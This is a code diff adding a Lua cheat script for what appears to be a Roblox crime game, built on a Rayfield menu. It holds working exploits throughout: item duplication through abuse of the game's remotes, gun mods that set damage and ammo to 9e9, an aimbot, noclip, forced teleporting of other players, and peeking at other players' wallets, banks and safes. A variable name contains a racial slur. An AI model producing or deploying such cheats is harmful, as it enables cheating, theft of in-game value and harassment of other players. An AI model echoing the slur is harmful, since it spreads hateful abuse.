+    {Name = "Pent House", Position = CFrame.new(-63, 283, -574)},
+    {Name = "Regular Apartment", Position = CFrame.new(-63, 283, -527)},
+    {Name = "Trash Apartment", Position = CFrame.new(68443, 52941, -736)},
+}
+
+local locationNames_Apartments = {}
+for _, location in ipairs(teleportLocations_Apartments) do
+    table.insert(locationNames_Apartments, location.Name)
+end
+
+TeleportTab:CreateDropdown({
+    Name = "Apartments",
+    Options = locationNames_Apartments,
+    CurrentOption = {locationNames_Apartments[1]},
+    MultipleOptions = false,
+    Flag = "ApartmentsDropdown",
+    Callback = function(Options)
+        local selectedLocation
+        for _, location in ipairs(teleportLocations_Apartments) do
+            if location.Name == Options[1] then
+                selectedLocation = location
+                break
+            end
+        end
+
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and selectedLocation then
+            player.Character.HumanoidRootPart.CFrame = selectedLocation.Position
+        else
+            warn("Teleport failed: Missing character or HumanoidRootPart")
+        end
+    end
+})
+
+
+-- Robbable Houses
+local teleportLocations_Houses = {
+    {Name = "House 1", Position = CFrame.new(-605, 258, -698)},
+    {Name = "House 2", Position = CFrame.new(-605, 258, -724)},
+}
+
+local locationNames_Houses = {}
+for _, location in ipairs(teleportLocations_Houses) do
+    table.insert(locationNames_Houses, location.Name)
+end
+
+TeleportTab:CreateDropdown({
+    Name = "Robbable Houses",
+    Options = locationNames_Houses,
+    CurrentOption = {locationNames_Houses[1]},
+    MultipleOptions = false,
+    Flag = "HousesDropdown",
+    Callback = function(Options)
+        for _, location in ipairs(teleportLocations_Houses) do
+            if location.Name == Options[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = location.Position
+                break
+            end
+        end
+    end
+})
+
+local teleportLocations_Houses = {
+    {Name = "Exotic Shop", Position = CFrame.new(-1525, 273, -984)},
+    {Name = "Car Shop", Position = CFrame.new(-346, 255, -1246)},
+    {Name = "Ice Box", Position = CFrame.new(-150, 284, -1258)},
+    {Name = "Tatto Shop", Position = CFrame.new(-712.4014282226562, 252.9751434326172, -519.5180053710938)},
+}
+    
+local locationNames_Houses = {}
+for _, location in ipairs(teleportLocations_Houses) do
+    table.insert(locationNames_Houses, location.Name)
+end
+
+TeleportTab:CreateDropdown({
+    Name = "Stores",
+    Options = locationNames_Houses,
+    CurrentOption = {locationNames_Houses[1]},
+    MultipleOptions = false,
+    Flag = "Dropdown",
+    Callback = function(Options)
+        for _, location in ipairs(teleportLocations_Houses) do
+            if location.Name == Options[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = location.Position
+                break
+            end
+        end
+    end
+})
+
+local teleportLocations_Houses = {
+    {Name = "Roof", Position = CFrame.new(-363, 340, -559)},
+    {Name = "Bank Vault", Position = CFrame.new(-122, 374, -1216)},
+    {Name = "Bank", Position = CFrame.new(-109, 374, -1215)},
+    {Name = "Basketball Court", Position = CFrame.new(-1056, 254, -496)},
+    {Name = "Basketball Court 2", Position = CFrame.new(-359, 254, -938)},
+    {Name = "Clean Money", Position = CFrame.new(-997, 254, -691)},
+    {Name = "Plant Buyer", Position = CFrame.new(-636, 253, -731)},
+    {Name = "Casino", Position = CFrame.new(92173, 121858, -16113)},
+    {Name = "Sewer", Position = CFrame.new(81112, 133133, 149)},
+    {Name = "Safe Spot", Position = CFrame.new(544, 283, -807)},
+}
+    
+local locationNames_Houses = {}
+for _, location in ipairs(teleportLocations_Houses) do
+    table.insert(locationNames_Houses, location.Name)
+end
+
+TeleportTab:CreateDropdown({
+    Name = "Others",
+    Options = locationNames_Houses,
+    CurrentOption = {locationNames_Houses[1]},
+    MultipleOptions = false,
+    Flag = "Dropdow",
+    Callback = function(Options)
+        for _, location in ipairs(teleportLocations_Houses) do
+            if location.Name == Options[1] then
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = location.Position
+                break
+            end
+        end
+    end
+})
+
+local TeleportSection = TeleportTab:CreateSection("Player Teleport")
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local dkIsANigger = {}
+
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        table.insert(dkIsANigger, player.Name)
+    end
+end
+
+local TeleportDropdown = TeleportTab:CreateDropdown({
+    Name = "Select Player",
+    Options = dkIsANigger,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "PlayerDropdown",
+    Callback = function(Options)
+        SelectedPlayer = Options[1]
+    end,
+})
+
+local function UpdateDropdown()
+    local ExistingPlayers = {}
+    for _, name in ipairs(dkIsANigger) do
+        ExistingPlayers[name] = true
+    end
+
+    local NewOptions = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            table.insert(NewOptions, player.Name)
+        end
+    end
+
+    dkIsANigger = NewOptions
+    TeleportDropdown:Set(dkIsANigger)
+end
+
+local TeleportButton = TeleportTab:CreateButton({
+    Name = "Teleport!",
+    Callback = function()
+        local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+        if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
+            LocalPlayer.Character:SetPrimaryPartCFrame(TargetPlayer.Character:GetPrimaryPartCFrame())
+        end
+    end,
+})
+
+local RefreshButton = TeleportTab:CreateButton({
+    Name = "Refresh Players",
+    Callback = UpdateDropdown,
+})
+
+local PlayerTab = Window:CreateTab("Player", 4483362458) -- Title, Image
+local PlayerSection = PlayerTab:CreateSection("Speed")
+
+local WalkSpeedEnabled = false
+local defaultWalkSpeed = 16
+local currentWalkSpeed = 16
+
+-- Create the toggle to enable/disable custom walk speed
+local Toggle = PlayerTab:CreateToggle({
+    Name = "Enable Walk Speed",
+    Callback = function()
+        WalkSpeedEnabled = not WalkSpeedEnabled
+
+        if WalkSpeedEnabled then
+            print("Custom Walk Speed Enabled")
+            -- Apply current slider value if toggle is enabled
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = currentWalkSpeed
+        else
+            print("Custom Walk Speed Disabled")
+            -- Reset to default walk speed
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = defaultWalkSpeed
+        end
+    end
+})
+
+-- Create the slider for adjusting walk speed
+local Slider = PlayerTab:CreateSlider({
+    Name = "Walk Speed (0-300)",
+    Range = {0, 300},
+    Increment = 1,
+    Suffix = "Unit",
+    CurrentValue = currentWalkSpeed,
+    Flag = "Slider2", -- Make sure this flag is unique
+    Callback = function(Value)
+        currentWalkSpeed = Value
+        if WalkSpeedEnabled then
+            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = currentWalkSpeed
+        end
+    end,
+})
+
+
+local PlayerSection = PlayerTab:CreateSection("Player Modify")
+
+local InfiniteJumpEnabled = false
+local jumpConnection
+local jumpPower = 50  -- Default jump power
+
+PlayerTab:CreateToggle({
+    Name = "Infinite-Jump",
+    Callback = function()
+        InfiniteJumpEnabled = not InfiniteJumpEnabled
+
+        if InfiniteJumpEnabled then
+            print("Infinite Jump Enabled")
+            jumpConnection = game:GetService("UserInputService").JumpRequest:Connect(function()
+                if InfiniteJumpEnabled then
+                    local humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass('Humanoid')
+                    if humanoid then
+                        humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                        humanoid.JumpHeight = jumpPower  -- Set jump height to slider value
+                    end
+                end
+            end)
+        else
+            print("Infinite Jump Disabled")
+            if jumpConnection then
+                jumpConnection:Disconnect()
+                jumpConnection = nil
+            end
+        end
+    end
+})
+
+local player = game:GetService("Players").LocalPlayer
+local noclip = false
+local noclipLoop
+
+local function toggleNoclip(state)
+    noclip = state
+    if noclip then
+        noclipLoop = task.spawn(function()
+            while noclip do
+                if player.Character then
+                    for _, part in pairs(player.Character:GetDescendants()) do
+                        if part:IsA("BasePart") then
+                            part.CanCollide = false
+                        end
+                    end
+                end
+                task.wait()
+            end
+        end)
+    else
+       
+        if noclipLoop then
+            task.cancel(noclipLoop)
+        end
+        if player.Character then
+            for _, part in pairs(player.Character:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = true
+                end
+            end
+        end
+    end
+end
+
+
+PlayerTab:CreateToggle({
+    Name = "Enable No Clip",
+    CurrentValue = false,
+    Flag = "NoclipToggle",
+    Callback = function(Value)
+        toggleNoclip(Value)
+    end
+})
+
+local DupeTab = Window:CreateTab("Dupe", 4483362458)
+local DupeSection = DupeTab:CreateSection("Gun Dupe Instructions")
+
+local Paragraph = DupeTab:CreateParagraph({Title = "Instructions", Content = "Hold the gun u want to dupe then press safe dupe button than wait for procces to finish then go to safe u have duped your gun."})
+
+local DupeSection = DupeTab:CreateSection("Safe Dupe")
+
+local v12 = 0
+local v13 = 35
+
+DupeTab:CreateButton({
+    Name = "Safe Dupe",
+    Callback = function()
+        local v164 = os.time()
+        if ((v164 - v12) < v13) then
+            Rayfield:Notify({
+                Title = "Dupe gun",
+                Content = "Please wait " .. v13 .. " seconds!",
+                Duration = 3
+            })
+            return
+        end
+
+        v12 = v164
+        Rayfield:Notify({
+            Title = "Dupe Gun",
+            Content = "Processing...",
+            Duration = 5
+        })
+
+        local function v165()
+            local player = game:GetService("Players").LocalPlayer
+            local gui = player:FindFirstChild("PlayerGui")
+            if not gui then return end
+
+            local blackout = Instance.new("ScreenGui")
+            blackout.Name = "TeleportBlackout"
+            blackout.Parent = gui
+
+            local frame = Instance.new("Frame")
+            frame.Size = UDim2.new(1, 0, 1, 0)
+            frame.Position = UDim2.new(0, 0, 0, 0)
+            frame.BackgroundColor3 = Color3.new(0, 0, 0)
+            frame.BackgroundTransparency = 0
+            frame.Parent = blackout
+
+            task.delay(1.5, function()
+                if blackout then blackout:Destroy() end
+            end)
+
+            return blackout
+        end
+
+        v165()
+
+        local replicatedStorage = game:GetService("ReplicatedStorage")
+        local players = game:GetService("Players")
+        local workspace = game:GetService("Workspace")
+
+        local function getCharacter()
+            return players.LocalPlayer.Character
+        end
+
+        local function teleportTo(position)
+            getCharacter().HumanoidRootPart.CFrame = CFrame.new(position.Position.X + 2, position.Position.Y, position.Position.Z)
+        end
+
+        local inventory = replicatedStorage:WaitForChild("Inventory")
+        local backpackRemote = replicatedStorage:WaitForChild("BackpackRemote")
+
+        if getCharacter():FindFirstChildOfClass("Tool") then
+            local step = 0
+            local toolName
+            local safe
+            local originalCFrame
+
+            while true do
+                if step == 4 then
+                    task.wait(0.5)
+                    teleportTo(originalCFrame)
+                    Rayfield:Notify({
+                        Title = "Dupe Gun",
+                        Content = "Duplication Complete!",
+                        Duration = 5
+                    })
+                    break
+                end
+                if step == 2 then
+                    task.spawn(function()
+                        backpackRemote:InvokeServer("Store", toolName)
+                    end)
+                    task.spawn(function()
+                        inventory:FireServer("Change", toolName, "Backpack", safe)
+                    end)
+                    task.wait(1.5)
+                    step = 3
+                end
+                if step == 3 then
+                    teleportTo(originalCFrame)
+                    task.wait(1)
+                    backpackRemote:InvokeServer("Grab", toolName)
+                    step = 4
+                end
+                if step == 0 then
+                    toolName = getCharacter():FindFirstChildOfClass("Tool").Name
+                    getCharacter():FindFirstChildOfClass("Humanoid"):UnequipTools()
+                    safe = workspace["1# Map"]["2 Crosswalks"].Safes:GetChildren()[1]
+                    step = 1
+                end
+                if step == 1 then
+                    originalCFrame = getCharacter():FindFirstChild("HumanoidRootPart").CFrame
+                    teleportTo(safe.Union.CFrame)
+                    task.wait(0.5)
+                    step = 2
+                end
+            end
+        else
+            Rayfield:Notify({
+                Title = "Dupe Gun",
+                Content = "No Tool Found!",
+                Duration = 5
+            })
+        end
+    end
+})
+
+DupeTab:CreateButton({
+    Name = "Teleport To A Safe",
+    Callback = function()
+        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-159, 295, -1010)
+    end
+})
+
+local CombatTab = Window:CreateTab("Combat", 4483362458) -- Title, Image
+local CombatSection = CombatTab:CreateSection("Gun Modify")
+
+CombatTab:CreateButton({
+    Name = "Apply All Gun Mods",
+    Callback = function()
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        
+        if tool then
+            local settingModule = nil
+            if tool:FindFirstChild("Setting") then
+                settingModule = require(tool.Setting)
+            elseif tool:FindFirstChild("Settings") then
+                settingModule = require(tool.Settings)
+            end
+            
+            if settingModule then
+                if settingModule.Auto ~= nil then
+                    settingModule.Auto = true
+                end
+
+                if settingModule.LimitedAmmoEnabled ~= nil then
+                    settingModule.LimitedAmmoEnabled = false
+                    settingModule.MaxAmmo = 9e9
+                    settingModule.AmmoPerMag = 9e9
+                    settingModule.Ammo = 9e9
+                end
+
+                if settingModule.BaseDamage ~= nil then
+                    settingModule.BaseDamage = 9e9
+                end
+
+                if settingModule.Recoil ~= nil then
+                    settingModule.Recoil = 0
+                end
+
+                if settingModule.FireRate ~= nil then
+                    settingModule.FireRate = 0
+                end
+            end
+        end
+    end
+})
+
+CombatTab:CreateToggle({
+    Name = "Automatic Gun",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            local setting = require(tool.Setting)
+            setting.Auto = Value
+        end
+    end
+})
+
+CombatTab:CreateToggle({
+    Name = "Inf Ammo",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            local setting = require(tool.Setting)
+            setting.LimitedAmmoEnabled = not Value
+            if Value then
+                setting.MaxAmmo = 9e9
+                setting.AmmoPerMag = 9e9
+                setting.Ammo = 9e9
+            end
+        end
+    end
+})
+
+CombatTab:CreateToggle({
+    Name = "Max Damage",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            local setting = require(tool.Setting)
+            setting.BaseDamage = Value and 9e9 or 25
+        end
+    end
+})
+
+CombatTab:CreateToggle({
+    Name = "Remove Recoil",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Settings") then
+            local settings = require(tool.Settings)
+            settings.Recoil = Value and 0 or 1
+        end
+    end
+})
+
+CombatTab:CreateToggle({
+    Name = "Instant Fire Rate",
+    CurrentValue = false,
+    Callback = function(Value)
+        local tool = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool")
+        if tool and tool:FindFirstChild("Setting") then
+            local setting = require(tool.Setting)
+            setting.FireRate = Value and 0 or 0.15
+        end
+    end,
+    SectionParent = GunSection
+})
+
+
+local CombatSection = CombatTab:CreateSection("Anti-Die")
+
+local player = game.Players.LocalPlayer
+
+local teleportHealth = 50
+local toggleEnabled = false
+
+local function getHumanoid()
+    return player.Character and player.Character:FindFirstChild("Humanoid")
+end
+
+CombatTab:CreateToggle({
+    Name = "Enable Anti Die",
+    CurrentValue = false,
+    Flag = "13",
+    Callback = function(Value)
+        toggleEnabled = Value
+    end    
+})
+
+CombatTab:CreateSlider({
+    Name = "Health to teleport at",
+    Range = {50, 99},
+    Increment = 1,
+    Suffix = "Health",
+    CurrentValue = 50,
+    Flag = "58",
+    Callback = function(Value)
+        teleportHealth = Value
+    end    
+})
+
+game:GetService("RunService").Heartbeat:Connect(function()
+    local humanoid = getHumanoid()
+    if humanoid and toggleEnabled then
+        if humanoid.Health < teleportHealth then
+            if player.Character and player.Character.PrimaryPart then
+                player.Character:SetPrimaryPartCFrame(CFrame.new(-357.28680419921875, 279.954833984375, -1177.158935546875))
+            end
+        end
+    end
+end)
+
+local TrollingTab = Window:CreateTab("Trolling", 4483362458) -- Title
+TrollingTab:CreateSection("Target Player")
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+-- Variables
+local playerList = {}
+local SelectedPlayer = nil
+local BringLoopRunning = false
+local SpectateRunning = false
+local TeleportLoopRunning = false
+
+-- Create initial player list
+for _, player in ipairs(Players:GetPlayers()) do
+    if player ~= LocalPlayer then
+        table.insert(playerList, player.Name)
+    end
+end
+
+-- Dropdown UI
+local TeleportDropdown = TrollingTab:CreateDropdown({
+    Name = "Select Player",
+    Options = playerList,
+    CurrentOption = {},
+    MultipleOptions = false,
+    Flag = "PlayerDropdown",
+    Callback = function(Options)
+        SelectedPlayer = Options[1]
+    end,
+})
+
+-- Refresh player list function
+local function RefreshPlayerList()
+    playerList = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            table.insert(playerList, player.Name)
+        end
+    end
+    TeleportDropdown:Set(playerList)
+end
+
+-- Refresh Button
+TrollingTab:CreateButton({
+    Name = "Refresh Players",
+    Callback = RefreshPlayerList,
+})
+
+-- Section: Spectate
+TrollingTab:CreateSection("Spectate")
+
+TrollingTab:CreateToggle({
+    Name = "Spectate Selected Player",
+    CurrentValue = false,
+    Flag = "SpectateToggle",
+    Callback = function(Value)
+        SpectateRunning = Value
+        if Value and SelectedPlayer then
+            local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+            if TargetPlayer and TargetPlayer.Character then
+                local targetRoot = TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if targetRoot then
+                    Camera.CameraSubject = targetRoot
+                end
+            end
+        elseif LocalPlayer.Character then
+            local myHumanoid = LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid")
+            if myHumanoid then
+                Camera.CameraSubject = myHumanoid
+            end
+        end
+    end,
+})
+
+TrollingTab:CreateButton({
+    Name = "View Inventory",
+    Callback = function()
+        if SelectedPlayer then
+            local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+            if TargetPlayer and TargetPlayer:FindFirstChild("Backpack") then
+                local inventory = TargetPlayer.Backpack:GetChildren()
+                if #inventory > 0 then
+                    local itemNames = {}
+                    for _, item in ipairs(inventory) do
+                        table.insert(itemNames, item.Name)
+                    end
+                    Rayfield:Notify({
+                        Title = "Inventory",
+                        Content = SelectedPlayer .. "'s items: " .. table.concat(itemNames, ", "),
+                        Duration = 6,
+                    })
+                else
+                    Rayfield:Notify({
+                        Title = "Inventory",
+                        Content = SelectedPlayer .. " has no items in their backpack.",
+                        Duration = 4,
+                    })
+                end
+            else
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Couldn't access backpack of " .. SelectedPlayer,
+                    Duration = 4,
+                })
+            end
+        else
+            Rayfield:Notify({
+                Title = "No Player Selected",
+                Content = "Please select a player first.",
+                Duration = 3,
+            })
+        end
+    end,
+})
+
+
+-- Section: Teleport
+TrollingTab:CreateSection("Teleport")
+
+TrollingTab:CreateButton({
+    Name = "Teleport To Selected Player",
+    Callback = function()
+        local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+        if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
+            local myRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+            local targetRoot = TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
+            if myRoot and targetRoot then
+                myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
+            end
+        else
+            warn("Teleport failed: Target or Local player not valid")
+        end
+    end,
+})
+
+TrollingTab:CreateToggle({
+    Name = "Loop Teleport To Selected Player",
+    CurrentValue = false,
+    Flag = "LoopTPToPlayerToggle",
+    Callback = function(Value)
+        TeleportLoopRunning = Value
+        if Value then
+            task.spawn(function()
+                while TeleportLoopRunning do
+                    local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+                    if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
+                        local myRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                        local targetRoot = TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                        if myRoot and targetRoot then
+                            myRoot.CFrame = targetRoot.CFrame + Vector3.new(0, 2, 0)
+                        end
+                    end
+                    task.wait(0.3)
+                end
+            end)
+        end
+    end,
+})
+
+-- Loop Bring
+TrollingTab:CreateToggle({
+    Name = "Loop Bring Selected Player",
+    CurrentValue = false,
+    Flag = "BringToggle",
+    Callback = function(Value)
+        BringLoopRunning = Value
+
+        if Value then
+            task.spawn(function()
+                while BringLoopRunning do
+                    local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+                    if TargetPlayer and TargetPlayer.Character and LocalPlayer.Character then
+                        local targetRoot = TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                        local myRoot = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+                        if targetRoot and myRoot then
+                            local frontPos = myRoot.CFrame.Position + myRoot.CFrame.LookVector * 3
+                            targetRoot.CFrame = CFrame.new(frontPos, myRoot.Position)
+                        end
+                    end
+                    task.wait(0.3)
+                end
+            end)
+        else
+            local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+            if TargetPlayer and TargetPlayer.Character then
+                local targetRoot = TargetPlayer.Character:FindFirstChild("HumanoidRootPart")
+                if targetRoot then
+                    targetRoot.CFrame = CFrame.new(0, -500, 0)
+                end
+            end
+        end
+    end,
+})
+
+-- Section: View Player
+TrollingTab:CreateSection("View Player")
+
+TrollingTab:CreateButton({
+    Name = "View Wallet",
+    Callback = function()
+        if SelectedPlayer then
+            local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+            if TargetPlayer and TargetPlayer:FindFirstChild("stored") and TargetPlayer.stored:FindFirstChild("Money") then
+                local amount = TargetPlayer.stored.Money.Value
+                Rayfield:Notify({
+                    Title = "Wallet",
+                    Content = SelectedPlayer .. " has $" .. tostring(amount),
+                    Duration = 5,
+                })
+            else
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Could not find money for " .. SelectedPlayer,
+                    Duration = 4,
+                })
+            end
+        else
+            Rayfield:Notify({
+                Title = "No Player Selected",
+                Content = "Please select a player first.",
+                Duration = 3,
+            })
+        end
+    end,
+})
+
+TrollingTab:CreateButton({
+    Name = "View Bank",
+    Callback = function()
+        if SelectedPlayer then
+            local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+            if TargetPlayer and TargetPlayer:FindFirstChild("stored") and TargetPlayer.stored:FindFirstChild("Bank") then
+                local bank = TargetPlayer.stored.Bank.Value
+                Rayfield:Notify({
+                    Title = "Bank",
+                    Content = SelectedPlayer .. " has $" .. tostring(bank) .. " in their bank.",
+                    Duration = 5,
+                })
+            else
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Could not find bank info for " .. SelectedPlayer,
+                    Duration = 4,
+                })
+            end
+        else
+            Rayfield:Notify({
+                Title = "No Player Selected",
+                Content = "Please select a player first.",
+                Duration = 3,
+            })
+        end
+    end,
+})
+
+TrollingTab:CreateButton({
+    Name = "View Safe Items",
+    Callback = function()
+        if SelectedPlayer then
+            local TargetPlayer = Players:FindFirstChild(SelectedPlayer)
+            if TargetPlayer and TargetPlayer:FindFirstChild("InvData") then
+                local inv = TargetPlayer.InvData:GetChildren()
+                if #inv > 0 then
+                    local itemList = {}
+                    for _, item in ipairs(inv) do
+                        table.insert(itemList, item.Name)
+                    end
+                    Rayfield:Notify({
+                        Title = "Safe Items",
+                        Content = SelectedPlayer .. " has: " .. table.concat(itemList, ", "),
+                        Duration = 6,
+                    })
+                else
+                    Rayfield:Notify({
+                        Title = "Safe Empty",
+                        Content = SelectedPlayer .. " has no items in their safe.",
+                        Duration = 4,
+                    })
+                end
+            else
+                Rayfield:Notify({
+                    Title = "Error",
+                    Content = "Could not access safe for " .. SelectedPlayer,
+                    Duration = 4,
+                })
+            end
+        else
+            Rayfield:Notify({
+                Title = "No Player Selected",
+                Content = "Please select a player first.",
+                Duration = 3,
+            })
+        end
+    end,
+})
+
+local BankTab = Window:CreateTab("Bank", 4483362458) -- Title, Image
+local BankSection = BankTab:CreateSection("Withdraw & Deposit")
+
+local lastEnteredAmount = 0
+local autoWithdraw = false
+local autoDeposit = false
+
+BankTab:CreateInput({
+    Name = "Amount",
+    CurrentValue = "",
+    PlaceholderText = "Input",
+    RemoveTextAfterFocusLost = false,
+    Flag = "BankAmount",
+    Callback = function(Text)
+        local amount = tonumber(Text)
+        if amount and amount > 0 then
+            lastEnteredAmount = amount
+            Rayfield:Notify({Title = "Amount Set", Content = "Ready to use $" .. amount, Duration = 2})
+        else
+            lastEnteredAmount = 0
+            Rayfield:Notify({Title = "Invalid", Content = "Please enter a valid number.", Duration = 2})
+        end
+    end,
+})
+
+BankTab:CreateButton({
+    Name = "Withdraw",
+    Callback = function()
+        if lastEnteredAmount > 0 and lastEnteredAmount <= 90000 then
+            game:GetService("ReplicatedStorage").BankAction:FireServer("with", lastEnteredAmount)
+            Rayfield:Notify({Title = "Withdraw", Content = "Withdrew $" .. lastEnteredAmount, Duration = 3})
+        else
+            Rayfield:Notify({Title = "Withdraw", Content = "Invalid amount! Max is 90K.", Duration = 3})
+        end
+    end,
+})
+
+BankTab:CreateButton({
+    Name = "Deposit",
+    Callback = function()
+        if lastEnteredAmount > 0 and lastEnteredAmount <= 30000 then
+            game:GetService("ReplicatedStorage").BankAction:FireServer("depo", lastEnteredAmount)
+            Rayfield:Notify({Title = "Deposit", Content = "Deposited $" .. lastEnteredAmount, Duration = 3})
+        else
+            Rayfield:Notify({Title = "Deposit", Content = "Invalid amount! Max is 30K.", Duration = 3})
+        end
+    end,
+})
+
+local BankSection = BankTab:CreateSection("Actions")
+
+BankTab:CreateToggle({
+    Name = "Auto Withdraw",
+    CurrentValue = false,
+    Flag = "AutoWithdraw",
+    Callback = function(Value)
+        autoWithdraw = Value
+        task.spawn(function()
+            while autoWithdraw do
+                if lastEnteredAmount > 0 and lastEnteredAmount <= 90000 then
+                    game:GetService("ReplicatedStorage").BankAction:FireServer("with", lastEnteredAmount)
+                end
+                task.wait(1)
+            end
+        end)
+    end,
+})
+
+BankTab:CreateToggle({
+    Name = "Auto Deposit",
+    CurrentValue = false,
+    Flag = "AutoDeposit",
+    Callback = function(Value)
+        autoDeposit = Value
+        task.spawn(function()
+            while autoDeposit do
+                if lastEnteredAmount > 0 and lastEnteredAmount <= 30000 then
+                    game:GetService("ReplicatedStorage").BankAction:FireServer("depo", lastEnteredAmount)
+                end
+                task.wait(1)
+            end
+        end)
+    end,
+})
+
+BankTab:CreateToggle({
+    Name = "Auto Drop",
+    CurrentValue = false,
+    Flag = "AutoDrop",
+    Callback = function(Value)
+        autoDrop = Value
+        task.spawn(function()
+            while autoDrop do
+                if lastEnteredAmount > 0 then
+                    local args = {
+                        [1] = "Drop",
+                        [2] = tostring(lastEnteredAmount)
+                    }
+                    game:GetService("ReplicatedStorage"):WaitForChild("BankProcessRemote"):InvokeServer(unpack(args))
+                end
+                task.wait(1)
+            end
+        end)
+    end,
+})
+
+BankTab:CreateButton({
+    Name = "Check Bank Balance",
+    Callback = function()
+        local balance = game:GetService("Players").LocalPlayer.stored.Bank.Value
+        Rayfield:Notify({
+            Title = "Money Check",
+            Content = "Your current bank balance is: $" .. tostring(balance),
+            Duration = 3
+        })
+    end
+})
+
+local AimbotTab = Window:CreateTab("Aimbot", 4483362458) -- Title, Image
+local AimbotSection = AimbotTab:CreateSection("Aimbot")
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local camera = workspace.CurrentCamera
+local localPlayer = Players.LocalPlayer
+
+local MAX_DISTANCE = 100
+local MAX_ANGLE = 45
+local aimLockEnabled = false
+local lockPartName = "Head"
+
+AimbotTab:CreateToggle({
+    Name = "Enable Aimbot",
+    CurrentValue = false,
+    Callback = function(value)
+        aimLockEnabled = value
+    end,
+})
+
+local function getNearestTarget()
+    local nearest = nil
+    local shortestDistance = MAX_DISTANCE
+
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= localPlayer and player.Character then
+            local targetPart = player.Character:FindFirstChild(lockPartName)
+            if targetPart then
+                local direction = (targetPart.Position - camera.CFrame.Position).Unit
+                local angle = math.deg(math.acos(camera.CFrame.LookVector:Dot(direction)))
+                local distance = (targetPart.Position - camera.CFrame.Position).Magnitude
+
+                if angle <= MAX_ANGLE and distance < shortestDistance then
+                    shortestDistance = distance
+                    nearest = targetPart
+                end
+            end
+        end
+    end
+
+    return nearest
+end
+
+RunService.RenderStepped:Connect(function()
+    if not aimLockEnabled then return end
+
+    local target = getNearestTarget()
+    if target then
+        local newCFrame = CFrame.new(camera.CFrame.Position, target.Position)
+        camera.CFrame = newCFrame
+    end
+end)
+
+AimbotTab:CreateDropdown({
+   Name = "Aim Part",
+   Options = {"Head","Torso"},
+   CurrentOption = {"Option 1"},
+   MultipleOptions = false,
+   Flag = "Dropdown1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
+   Callback = function(Options)
+   
+   end,
+})
+
+AimbotTab:CreateSection("FOV Circle")
+
+local UserInputService = game:GetService("UserInputService")
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+
+local localPlayer = Players.LocalPlayer
+local mouse = localPlayer:GetMouse()
+
+local aimCircleRadius = 100
+local aimCircleThickness = 2
+local circleColor = Color3.fromRGB(128, 0, 128)
+local aimCircle = nil
+local fovEnabled = false
+
+local function createAimCircle()
+    if not aimCircle then
+        aimCircle = Drawing.new("Circle")
+        aimCircle.Visible = true
+        aimCircle.Filled = false
+        aimCircle.Color = circleColor
+        aimCircle.Thickness = aimCircleThickness
+    end
+    aimCircle.Radius = aimCircleRadius
+end
+
+RunService.RenderStepped:Connect(function()
+    if fovEnabled then
+        if not aimCircle then
+            createAimCircle()
+        end
+        aimCircle.Position = Vector2.new(mouse.X, mouse.Y + 40)
+        aimCircle.Visible = true
+    else
+        if aimCircle then
+            aimCircle.Visible = false
+        end
+    end
+end)
+
